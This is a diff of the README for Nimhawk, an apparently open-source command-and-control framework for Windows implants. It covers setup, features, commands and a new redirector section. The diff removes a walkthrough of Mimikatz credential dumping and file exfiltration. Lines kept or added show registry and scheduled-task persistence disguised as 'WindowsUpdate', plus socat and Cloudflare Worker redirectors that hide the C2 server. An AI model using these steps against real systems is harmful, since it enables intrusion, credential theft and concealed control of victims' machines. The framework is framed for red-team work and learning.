@@ -10,47 +10,122 @@
 [![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-Support-orange.svg)](https://buymeacoffee.com/hdbreaker9s)
 </div>
 
-> **Development status**: Nimhawk is currently in active development. Core functionality is working, but some features are still experimental. The implant only supports Windows x64 platforms. Contributions and feedback are highly welcomed!
+> 🚧 **Development status**: Nimhawk is currently in active development. Core functionality is working, but some features are still experimental. The implant only supports Windows x64 platforms. Contributions and feedback are highly welcomed!
 
-> Hey! If you're into Malware Dev, Hacking, Exploit writing or just a tech nerd like me - hit me up! Always looking for new hacker friends to collaborate, share ideas and maybe grab a beer. No fancy resumes needed. 
+> 🤝 **Code contribution**: I'm looking forward to developers building a Linux agent for Nimhawk. The developer's documentation, especially the section 'How to develop your own Implant or extend Implant functionality,' should be enough for the task.
 
-## Support the Project
-
-If you find **Nimhawk** useful in your work or work / research, consider supporting its development!  
-Contributions are always welcome — whether it's through code, ideas, or simply helping spread the word.  
-
-And hey, if coding isn't your thing, feel free to send a beer, you know, every bit helps keep the project going!
-
-[![Buy Me A Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/hdbreaker9s)
-
+> 🤝 **Community**: Hey! If you're into Malware Dev, Hacking, Exploit writing or just a tech nerd like me - hit me up! Always looking for new hacker friends to collaborate, share ideas and maybe grab a beer. No fancy resumes needed.
 
 ## Table of Contents
+
+### 1. Getting Started
 - [Introduction](#introduction)
-- [Key features](#key-features)
-- [Recent improvements](#recent-improvements)
-- [Screenshots](#screenshots)
-- [System requirements](#system-requirements)
+- [Key Features](#key-features)
+- [Quick Start Guide](#quick-start-guide)
+- [Basic Usage](#basic-usage)
+
+### 2. Setup and Configuration
+- [System Requirements](#system-requirements)
 - [Compatibility](#compatibility)
-- [Development environment setup](#development-environment-setup)
+- [Development Environment Setup](#development-environment-setup)
 - [Configuration](#configuration)
-- [Quick start guide](#quick-start-guide)
-- [Basic usage](#basic-usage)
-- [Future development](#future-development)
-- [Notes and considerations](#notes-and-considerations)
-- [FAQ](#faq)
-- [Research and inspiration](#research-and-inspiration)
-- [Development](#development)
-- [Acknowledgments](#acknowledgments)
-- [Community quote](#community-quote)
-- [Disclaimer](#disclaimer)
+
+### 3. Technical Documentation
 - [Architecture](#architecture)
-- [Available commands](#available-commands)
-- [C2 framework comparison](#c2-framework-comparison)
-- [Command examples](#command-examples)
-- [Docker support](#docker-support)
-- [Workspace management system](#workspace-management-system)
-- [File exchange system](#file-exchange-system)
-- [Support the project](#support-the-project)
+- [Authentication System](#authentication-system)
+- [Available Commands](#available-commands)
+- [File Exchange System](#file-exchange-system)
+
+### 4. Deployment Options
+- [Docker Support](#docker-support)
+- [Redirector Setup](#redirector-setup)
+- [Frontend Configuration](#frontend-configuration)
+
+### 5. Development and Contributing
+- [Development](#development)
+- [Future Development](#future-development)
+- [Research and Inspiration](#research-and-inspiration)
+
+### 6. Reference
+- [FAQ](#faq)
+- [Troubleshooting](#troubleshooting)
+- [Notes and Considerations](#notes-and-considerations)
+- [Disclaimer](#disclaimer)
+
+## Quick Start Guide
+
+> 💡 **Pro Tip**: Before diving in, make sure to review the [System Requirements](#system-requirements) section.
+
+### 1. Dependencies Installation
+
+#### Installing Nim and Nimble
+```bash
+# On Linux/macOS using choosenim
+# In Silicon Mac you will need to compile nim. Chill google about it, it's easy!
+curl https://nim-lang.org/choosenim/init.sh -sSf | sh
+
+```
+
+### Initial Setup
+```bash
+# Clone the repository
+git clone https://github.com/hdbreaker/nimhawk
+cd nimhawk
+
+# Configure your environment
+cp config.toml.example config.toml
+```
+
+#### Installing Nimble Modules
+```bash
+# Navigate to implant directory
+cd implant/
+
+# Install required dependencies
+nimble install
+```
+
+#### Installing Python Dependencies
+```bash
+# Navigate to server directory
+cd server/
+
+# Create and activate virtual environment
+python3 -m venv venv
+
+# On Linux/macOS
+source venv/bin/activate
+# On Windows
+.\venv\Scripts\activate
+
+# Install dependencies
+pip install -r requirements.txt
+```
+
+#### Installing Frontend Dependencies
+```bash
+# Navigate to web interface directory
+cd server/admin_web_ui/
+
+# Install Node.js dependencies
+npm install
+
+# Run Frontend
+npm run dev
+```
+
+### 3. Start the Server
+```bash
+python3 nimhawk.py server
+```
+
+### 4. Access the Web Interface
+- Open your browser and navigate to `http://localhost:3000`
+- Default credentials:
+  - Email: `admin@nimhawk.com`
+  - Password: `P4ssw0rd123$`
+
+> ⚠️ **Security Note**: Change default credentials immediately in production environments.
 
 ## Introduction
 
@@ -62,32 +137,43 @@ This project would not exist without Cas's technical expertise, dedication to op
 - Enhancements to implant security and evasion capabilities
 - A completely renovated graphical interface with modern authentication
 - Improved data handling and command processing systems
+- Comprehensive documentation focused on practical deployment and usage
+- Enhanced multi-user support with role-based access control
+- Advanced workspace management for better operational organization
+- Real-time implant status monitoring with visual indicators
+- Improved file transfer system with preview capabilities
+- Robust error handling and reconnection mechanisms
+- Integrated build system with web-based compilation
+- Flexible deployment options including Docker support
 
 We are profoundly grateful to Cas van Cooten for his generosity in open-sourcing NimPlant, his ongoing contributions to the security community, and his pioneering work in leveraging the Nim language for security tools. We also extend our thanks to all NimPlant contributors who have helped shape the codebase that serves as our foundation.
 
-## Key features
+## Key Features
 
-- **Modular architecture**: Designed to facilitate collaborative development and expansion.
-- **Enhanced implant**: Modifications to reduce detection by security solutions.
-- **Advanced web interface**: Intuitive dashboard with authentication for implant management and data visualization.
-- **Compilation from web interface**: Generate implants with different configurations directly from the dashboard.
-- **Improved security**: Machine-to-machine authentication system and robust reconnection.
-- **Optimized data storage**: Refined check-in system and data transfer calculation.
-- **Improved debugging**: Enhanced logging and error handling for easier troubleshooting.
-- **Multi-status implant support**: Visual tracking system with color-coded statuses (active, late, disconnected, inactive) for better operational awareness.
+> 🎯 **Core Capabilities**: Nimhawk combines powerful features with operational security.
+
+### Operational Features
+- ✨ **Modular Architecture**: Designed for easy expansion
+- 🛡️ **Enhanced Implant**: Reduced detection signatures
+- 🌐 **Advanced Web Interface**: Intuitive dashboard
+- 🔧 **Web Compilation**: Generate implants from dashboard
+
+### Security Features
+- 🔐 **Improved Security**: Dual authentication system
+- 📊 **Optimized Storage**: Efficient data handling
+- 🔍 **Enhanced Debugging**: Improved error tracking
+- 📡 **Multi-Status Support**: Real-time implant monitoring
 
 ## Recent improvements
 
 * **Enhanced check-in system**: Implemented optimized tracking for implant check-ins, separating them from command history for cleaner console output
 * **Refined data transfer calculation**: More accurate measurement of data transferred between server and implants
 * **UI improvements**: Enhanced implant details display with real-time metrics and more intuitive layout
-* **Bug fixes**: Resolved critical issues with dependency imports and CORS header handling
 * **Improved reconnection system**: Enhanced implant reconnection mechanism that properly handles Registry cleanup, removing previous implant ID before registering a new one to prevent orphaned entries
 * **Inactive implant management**: Added ability to safely delete inactive implants from the database, maintaining a clean operational environment (I have a bug to check here, I will be fixing it soon, nothing really important!)
 * **Comprehensive Web UI**: Full-featured web interface for real-time monitoring and control of implants
-* **File system operations**: Expanded capabilities for file management
 
-## Screenshots
+## Nimhawk's Screenshots 
 
 ### Secure authentication
 [![Dashboard login](docs/images/login.png)](docs/images/login.png)
@@ -152,13 +238,15 @@ We are profoundly grateful to Cas van Cooten for his generosity in open-sourcing
 [![Global File Transfer History](docs/images/global-file-history.png)](docs/images/global-file-history.png)
 *Complete file transfer history tracking all uploads and downloads across all operations with detailed metadata and timestamps.*
 
-## System requirements
+## System Requirements
 
-### Server
-- Python 3.8 or higher
-- Dependencies specified in `server/requirements.txt`
-- Any modern OS (Linux, macOS, Windows)
-- Minimum 2GB RAM and 1GB disk space
+### Server Requirements
+| Component | Requirement | Notes |
+|-----------|-------------|--------|
+| Python | 3.8+ | Required for backend |
+| RAM | 2GB+ | Minimum recommended |
+| Disk | 1GB+ | For database and logs |
+| OS | Any modern OS | Linux recommended |
 
 ### Implant (Nim)
 - **Target Platform**: Windows x64 only (Windows 7 SP1, Windows 8.1, Windows 10, Windows 11, Server 2012 R2+)
@@ -189,7 +277,7 @@ We are profoundly grateful to Cas van Cooten for his generosity in open-sourcing
 | Linux | Any | ❌ Not Supported | Planned for future releases |
 | Windows | x86/32-bit | ❌ Not Supported | No plans to support |
 
-### Compiler compatibility
+## Compiler compatibility
 | Compiler | Host OS | Target | Status |
 |----------|---------|--------|--------|
 | Nim + MinGW | Linux | Windows x64 | ✅ Fully Supported |
@@ -197,38 +285,6 @@ We are profoundly grateful to Cas van Cooten for his generosity in open-sourcing
 | Nim | Windows | Windows x64 | ✅ Fully Supported |
 
 Note: The implant is currently developed and tested exclusively for 64-bit Windows environments. Support for other platforms is on the roadmap but not currently available.
-
-## Development environment setup
-
-### Python environment
-
-Nimhawk's server component uses Python virtual environments to manage dependencies. Follow these steps to set up the Python environment:
-
-1. **Create a virtual environment**:
-   ```bash
-   # Navigate to the server directory
-   cd server/
-   
-   # Create a virtual environment
-   python3 -m venv venv
-   
-   # Activate the virtual environment
-   # On Linux/macOS:
-   source venv/bin/activate
-   # On Windows:
-   venv\Scripts\activate
-   ```
-
-2. **Install dependencies**:
-   ```bash
-   # Install all required packages
-   pip install -r requirements.txt
-   ```
-
-3. **Using the environment**:
-   - Always activate the virtual environment before running the server
-   - The environment isolates dependencies to avoid conflicts with system packages
-   - If you add new dependencies, update requirements.txt with `pip freeze > requirements.txt`
 
 ### Cross-compiling with nim.cfg
 
@@ -387,12 +443,6 @@ python3 main.py Nimhawk
 
 This will start both the Implant API server and the Admin API server on the configured ports.
 
-## Future development
-
-The Nimhawk team is actively working on:
-
-IMPORTANT: Non of them are in place right now so all helps in any of this topics will be great!
-
 ## Development roadmap
 
 <div align="center">
@@ -498,13 +548,6 @@ The project aims to incorporate best practices from these sources while contribu
 
 For detailed information about the project structure, development setup, and contribution guidelines, please refer to our [DEVELOPERS.md](DEVELOPERS.md) guide.
 
-This guide includes:
-- Development environment setup
-- Project architecture overview
-- Pull request guidelines
-- Build and deployment instructions
-- Detailed documentation of recent improvements
-
 We welcome contributions from the community! Before starting, please review our development documentation to ensure a smooth collaboration process.
 
 Please note: Nimhawk is currently under active development. While we strive for stability, you may encounter issues. We encourage you to report (and fix) any bugs by creating a Pull Request and joining our development community.
@@ -566,7 +609,7 @@ Nimhawk only works on Windows x64.
 Nimhawk is a Command & Control (C2) framework designed for red team operations, featuring a Python backend server and implants written in the Nim programming language.
 
 #### How is Nimhawk different from other C2 frameworks?
-Nimhawk prioritizes modularity, lightweight operation, and modern UI, while leveraging Nim's cross-compilation capabilities and evasion potential. Unlike some frameworks, it focuses on simplicity and usability without sacrificing advanced features.
+It does not really do. I created it primarily to improve my own malware development skills and share the learning journey with others. If you're interested in understanding how C2s work or want to learn Nim for security development, this project's documentation and code will be helpful. And hey, if you're into malware development for research or defense, feel free to learn from my mistakes!
 
 #### Is Nimhawk free to use?
 Yes, Nimhawk is open-source and free to use under the terms specified in the license. However, it's designed for legitimate security testing with proper authorization.
@@ -600,11 +643,8 @@ Nimhawk has a dual authentication system:
 #### What are the implant's persistence capabilities?
 Currently, persistence must be manually implemented using standard Windows persistence techniques (Registry, Scheduled Tasks, Services). The implant itself does not have built-in persistence mechanisms.
 
-#### How do I update an existing implant?
-Nimhawk doesn't currently support in-memory updating of implants. You would need to deploy a new implant with updated configurations.
-
 #### How can I contribute to Nimhawk?
-Contributions are welcome! Check the Development section and the DEVELOPERS.md file for guidelines on contributing to the project.
+Contributions are welcome! Check DEVELOPERS.md file for guidelines on contributing to the project.
 
 ## Architecture
 
@@ -641,79 +681,46 @@ Contributions are welcome! Check the Development section and the DEVELOPERS.md f
 └────────────────────────────────────────┘              └───────────────────┘
 ```
 
-Nimhawk implements a client-server architecture with strictly separated communication paths:
+Nimhawk uses a basic client-server architecture - nothing groundbreaking, but it gets the job done:
 
-1. **Implant**: Deployed on target systems, communicates exclusively with the Implants Server using customizable HTTP(S) paths. Written in Nim to provide a small footprint and evasion capabilities.
+1. **Implant (The Agent)**:
+   - Written in Nim because I wanted to improve my maldev skills in this language
+   - Some evasion tricks I learned along the way
+   - Easy to extend if you want to add your own commands (it would be amazing if you join the Nimhawk Army!)
+   - Uses XOR encryption (yeah, I know, but it works - Make it work, later you can make it better!)
 
-2. **Python Backend**: Contains two independent servers with distinct responsibilities:
-   - **Admin API Server**: Provides the REST API for the administration web interface, with its own authentication layer. Communicates bidirectionally with the Web UI via HTTPS REST calls. Never communicates directly with implants. Can be configured as API-only mode.
-   - **Implants Server**: Exclusively handles communication with implants, receiving and processing their check-ins and results. No direct communication with the Web UI.
+2. **Backend (The Server Stuff)**:
+   - **Admin API**:
+     - Regular REST API with some basic auth
+     - Nothing fancy, just the basics that work
+   
+   - **Implant Server**:
+     - Handles the implants' check-ins and tasks
+     - Simple queue system for commands
+     - Basic status tracking
+     - Auto-reconnect when things break
+     - basic http auth vía machine to machine tokens
 
-3. **Admin Web UI**: Web interface for operators, built with React/Next.js. Communicates bidirectionally with the Admin API Server through REST calls over HTTPS. Has no direct communication with implants.
+3. **Web UI (The Pretty Part)**:
+   - React because... well, it's React
+   - Real-time updates (when they work)
+   - Web-based implant builder
 
-4. **Database (nimhawk.db)**: SQLite database that stores all information about implants, users, command history, and downloaded files. Both servers (Implants and Admin) read from and write to this database, which serves as the data coordination point between components.
+4. **Database**:
+   - Just SQLite - keeping it simple
+   - Stores implant info and commands
+   - Some basic file handling
 
-Authentication is implemented at two independent levels:
+5. **Security Stuff**
+   - Custom headers for implants
+   - Some anti-debug tricks
+   - Basic encryption
+   - Nothing revolutionary, but secure enough for learning
 
-- **Web UI/API Authentication**: Based on usernames and passwords, with session management for access to the administration interface.
-- **Implant/Server Authentication**: Using a pre-shared key (`httpAllowCommunicationKey`) and custom HTTP headers (`X-Correlation-ID`).
-
-## Real-World use case scenario
-
-Below is a walkthrough of a typical penetration testing scenario using Nimhawk:
-
-### Initial Access Phase
-
-A penetration tester has obtained initial access to a target machine through a phishing campaign. 
-The tester builds a customized Nimhawk implant with the following characteristics:
-
-```bash
-# Web UI: Configure and build implant
-- Listener: 192.168.1.100:443
-- Sleep: 30 seconds with 20% jitter
-- Encrypted comms with custom certificate
-- Process injection capability enabled
-```
-
-### Execution and Establishment
-
-After deployment, the implant reports back to the C2 server:
-
-```
-[+] New implant registered: DESKTOP-AB123CD (CORP\user)
-[+] Operating System: Windows 10 Enterprise
-[+] Network IP: 10.10.15.25 (Internal), 192.168.1.23 (External)
-```
-
-### Reconnaissance Phase
-
-The penetration tester conducts initial recon:
-
-```bash
-# Check environment
-whoami /all
-hostname
-getdom
-getav
-
-# Network enumeration
-shell ipconfig /all
-shell route print
-shell netstat -ano
-```
-
-### Lateral Movement
-
-After identifying potential targets for lateral movement:
-
-```bash
-# Upload Mimikatz to memory and dump credentials
-upload C:\Windows\Temp\mimikatz.exe
-shell mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
-
-# Create a new implant for lateral movement
-# Build via Web UI targeting another system using discovered credentials
-```
+6. **Dev Features**
+   - Logs everything (maybe too much)
+   - Good documentation
+   - Code that works or must do!
 
 ### Persistence (Optional)
 
@@ -727,36 +734,10 @@ shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUp
 shell schtasks /create /sc minute /mo 30 /tn "WindowsUpdate" /tr "C:\Users\user\Documents\update.exe" /f
 ```
 
-### Data Exfiltration
+Probably you will need to add a loader at the moment, if you know what is a Loader well done!
+But if you don't, I recommend checking out [Maldev Academy](https://maldevacademy.com/) and [Sektor7](https://institute.sektor7.net/).
 
-Collecting and exfiltrating valuable data:
-
-```bash
-# Gather specific files
-ls C:\Users\Administrator\Documents
-download C:\Users\Administrator\Documents\financial_report.xlsx
-
-# Compress and download multiple files
-shell powershell Compress-Archive -Path "C:\Users\user\Documents\Project*" -DestinationPath "C:\Temp\projects.zip"
-download C:\Temp\projects.zip
-```
-
-### Cleanup
-
-At the end of the engagement:
-
-```bash
-# Remove artifacts
-shell del C:\Temp\projects.zip
-shell del C:\Windows\Temp\mimikatz.exe
-
-# Remove implant
-kill
-```
-
-This scenario demonstrates how Nimhawk can be used effectively in a complete penetration testing workflow, from initial access to cleanup, while maintaining operational security and minimizing noise on the target system.
-
-## Available Commands
+## Available Commands (inherited and extended from NimPlant)
 
 The Nimhawk implant supports the following commands:
 
@@ -921,21 +902,256 @@ IMPLANT_SERVER_PORT=443
 This configuration allows you to host the UI on a separate service from the backend, which can be useful for scaling, security segregation, or cloud-based deployments.
 
 
-## Security Considerations for Production 
+# Redirector Setup
 
-For production deployments, please take the following into account:
+In this section, we will explain how to configure multiple redirectors theoretically. This system has not been tested in production yet, but it should work according to traffic redirection principles. Redirectors act as intermediaries between the implant and the C2 server, helping to protect the actual server infrastructure.
 
-### Access Restrictions
-- **Firewall Rules:** Set up firewall rules and HTTP access controls to limit access to the admin panel to authorized IP addresses only.
-- **Never expose the admin interface to the public.**
+## Basic Redirector Setup
 
-### HTTPS Deployment
-- Although current development uses HTTP (with application-layer encryption), **production deployments must use HTTPS**.
-- This typically involves setting up **Nginx with Gunicorn** or a similar reverse proxy and application server configuration.
+The simplest way to set up a redirector is using socat:
 
-### HTTPS Testing Status
-- HTTPS functionality still requires additional testing.
-- Current development uses HTTP with encryption handled at the application layer, but proper **TLS implementation is strongly recommended** for production.
+```bash
+# Install socat
+apt-get install socat
 
-### Certbot Integration
-- The team welcomes collaboration to implement **automated HTTPS certificate provisioning using Certbot** to streamline secure deployments.
+# Basic HTTP redirector
+# Listens on port 80 and redirects all traffic to C2 server at 192.168.1.100:80
+socat TCP4-LISTEN:80,fork TCP4:192.168.1.100:80
+
+# HTTPS redirector (requires SSL certificate)
+# Listens on port 443 and redirects to C2 server at 192.168.1.100:443
+socat OPENSSL-LISTEN:443,fork,reuseaddr,cert=server.pem,verify=0 TCP4:192.168.1.100:443
+```
+
+## Advanced Redirector Configuration
+
+For more sophisticated setups, you can use socat with additional options:
+
+```bash
+# Redirector with logging
+# Listens on 192.168.1.200:80, redirects to 192.168.1.100:80 and saves logs
+socat TCP4-LISTEN:80,fork,reuseaddr TCP4:192.168.1.100:80 | tee -a /var/log/redirector.log
+
+# Redirector with header modification
+# Listens on 192.168.1.200:80 and modifies Host header before redirecting
+socat TCP4-LISTEN:80,fork,reuseaddr \
+  SYSTEM:'while read line; do \
+    if [[ $line =~ ^Host: ]]; then \
+      echo "Host: 192.168.1.100"; \
+    else \
+      echo "$line"; \
+    fi; \
+  done' \
+  TCP4:192.168.1.100:80
+```
+
+## Cloudflare worker redirector
+
+For a more resilient and distributed setup, you can use Cloudflare Workers:
+
+```javascript
+// Cloudflare Worker code for redirector
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request))
+})
+
+async function handleRequest(request) {
+  // Modify headers as needed if you need it.
+  const headers = new Headers(request.headers)
+  headers.set('X-Forwarded-For', '192.168.1.100')
+  
+  // Forward request to C2 server
+  const response = await fetch('https://192.168.1.100', {
+    method: request.method,
+    headers: headers,
+    body: request.body
+  })
+  
+  return response
+}
+```
+
+## Redirector Chain
+
+For additional security, you can chain multiple redirectors:
+
+```
+Implant -> Redirector1 (192.168.1.100) -> Redirector2 (192.168.1.150) -> C2 Server (192.168.1.200)
+```
+
+```bash
+# First redirector (192.168.1.100)
+# Listens on port 80 and redirects to second redirector
+socat TCP4-LISTEN:80,fork,reuseaddr TCP4:192.168.1.150:80
+
+# Second redirector (192.168.1.150)
+# Listens on port 80 and redirects to final C2 server
+socat TCP4-LISTEN:80,fork,reuseaddr TCP4:192.168.1.200:80
+```
+
+## Security Considerations
+
+When using multi chain redirectors:
+
+1. **IP Whitelisting**: Configure firewall rules to create a secure chain:
+   ```bash
+   # On Redirector1 (192.168.1.100) - Accepts all connections, this server will be the one used in Implant `callBackIP` in config.toml
+   iptables -A INPUT -p tcp --dport 80 -j ACCEPT   # Allow all incoming HTTP traffic
+   iptables -A INPUT -p tcp --dport 443 -j ACCEPT  # Allow all incoming HTTPS traffic
+
+   # On Redirector2 (192.168.1.150) - Only accepts from Redirector1
+   iptables -A INPUT -p tcp -s 192.168.1.100 --dport 80 -j ACCEPT   # Allow HTTP from Redirector1
+   iptables -A INPUT -p tcp -s 192.168.1.100 --dport 443 -j ACCEPT  # Allow HTTPS from Redirector1
+   iptables -A INPUT -p tcp --dport 80 -j DROP   # Block all other HTTP traffic
+   iptables -A INPUT -p tcp --dport 443 -j DROP  # Block all other HTTPS traffic
+
+   # On C2 Server (192.168.1.200) - Only accepts from Redirector2
+   iptables -A INPUT -p tcp -s 192.168.1.150 --dport 80 -j ACCEPT   # Allow HTTP from Redirector2
+   iptables -A INPUT -p tcp -s 192.168.1.150 --dport 443 -j ACCEPT  # Allow HTTPS from Redirector2
+   iptables -A INPUT -p tcp --dport 80 -j DROP   # Block all other HTTP traffic
+   iptables -A INPUT -p tcp --dport 443 -j DROP  # Block all other HTTPS traffic
+   ```
+
+2. **Logging**: Enable logging to monitor traffic patterns
+   ```bash
+   # Monitor active connections
+   watch -n 1 "netstat -an | grep :80"
+   
+   # View logs in real-time
+   tail -f /var/log/redirector.log
+   ```
+
+3. **SSL/TLS**: Use HTTPS redirectors with proper certificates
+   ```bash
+   # Generate SSL certificate on Operator machine
+   openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+   
+   # Start HTTPS redirector on Redirector1 (exposed to agents)
+   socat OPENSSL-LISTEN:443,fork,reuseaddr,cert=cert.pem,verify=1 \
+     TCP4:192.168.1.150:443 | tee -a /var/log/redirector1.log
+
+   # Start HTTPS redirector on Redirector2 (only accepts from Redirector1)
+   socat OPENSSL-LISTEN:443,fork,reuseaddr,cert=cert.pem,verify=1 \
+     TCP4:192.168.1.200:443 | tee -a /var/log/redirector2.log
+
+   # On C2 Server (192.168.1.200)
+   # Configure firewall to only accept from Redirector2
+   iptables -A INPUT -p tcp -s 192.168.1.150 --dport 443 -j ACCEPT
+   iptables -A INPUT -p tcp --dport 443 -j DROP
+
+   # Configure C2 server in config.toml
+   [server]
+   sslCert = "cert.pem"
+   sslKey = "key.pem"
+   sslVerify = true  # Enable SSL verification
+   ```
+
+## Complete Deployment example
+
+Here's a complete example of setting up the redirector chain:
+
+```bash
+
+# Create SSL certificate on Operator machine:
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+
+# On Redirector1 (192.168.1.100) - Exposed to agents
+apt-get update
+apt-get install socat
+
+# Configure firewall to accept all connections (Not always needed)
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+
+# Start HTTPS redirector
+socat OPENSSL-LISTEN:443,fork,reuseaddr,cert=cert.pem,key=key.pem,verify=0 \
+  TCP4:192.168.1.150:443 | tee -a /var/log/redirector1.log
+
+# On Redirector2 (192.168.1.150) - Start Redirector 1 and only accepts from Redirector1
+apt-get update
+apt-get install socat
+
+# Configure firewall to only accept from Redirector1 (Optional)
+iptables -A INPUT -p tcp -s 192.168.1.100 --dport 443 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j DROP
+
+# Start HTTPS redirector
+socat OPENSSL-LISTEN:443,fork,reuseaddr,cert=cert.pem,key=key.pem,verify=0 \
+  TCP4:192.168.1.200:443 | tee -a /var/log/redirector2.log
+
+# On C2 Server (192.168.1.200) - Only accepts from Redirector2  (Optional)
+# Configure firewall to only accept from Redirector2
+iptables -A INPUT -p tcp -s 192.168.1.150 --dport 443 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j DROP
+
+# Configure C2 server in config.toml
+   [server]
+   sslCert = "cert.pem"
+   sslKey = "key.pem"
+   sslVerify = true  # Enable SSL verification
+```
+
+## Opening HTTP Redirector with socat
+
+To start a basic HTTP redirector with socat:
+
+```bash
+# Basic HTTP redirector
+# Listens on port 80 and redirects all traffic to C2 server at 192.168.1.200:80
+socat TCP4-LISTEN:80,fork TCP4:192.168.1.200:80
+
+# HTTP redirector with logging
+# Listens on 192.168.1.100:80, redirects to 192.168.1.200:80 and saves logs
+socat TCP4-LISTEN:80,fork,reuseaddr TCP4:192.168.1.200:80 | tee -a /var/log/redirector.log
+
+# HTTP redirector with header modification
+# Listens on 192.168.1.100:80 and modifies Host header before redirecting
+socat TCP4-LISTEN:80,fork,reuseaddr \
+  SYSTEM:'while read line; do \
+    if [[ $line =~ ^Host: ]]; then \
+      echo "Host: 192.168.1.200"; \
+    else \
+      echo "$line"; \
+    fi; \
+  done' \
+  TCP4:192.168.1.200:80
+```
+
+### Example Deployment
+
+```bash
+# On redirector server (192.168.1.100) - exposed to implants 
+apt-get update
+apt-get install socat
+
+# Configure firewall to allow HTTP traffic
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+
+# Start HTTP redirector with logging
+socat TCP4-LISTEN:80,fork,reuseaddr TCP4:192.168.1.200:80 | tee -a /var/log/redirector.log
+
+# On C2 Server (192.168.1.200) - Only accepts from Redirector (Optional)
+iptables -A INPUT -p tcp -s 192.168.1.100 --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -j DROP
+
+```
+
+## Implant Configuration for HTTP or HTTPS
+
+Remember to update the implant configuration to point to the first redirector:
+
+```toml
+# In config.toml
+[implant]
+listenerIp = "192.168.1.100"  # First redirector IP (exposed to implants)
+```
+
+### Monitoring Redirector
+
+```bash
+# Monitor active connections
+watch -n 1 "netstat -an | grep :80"
+
+# View redirector logs
+tail -f /var/log/redirector.log
+```
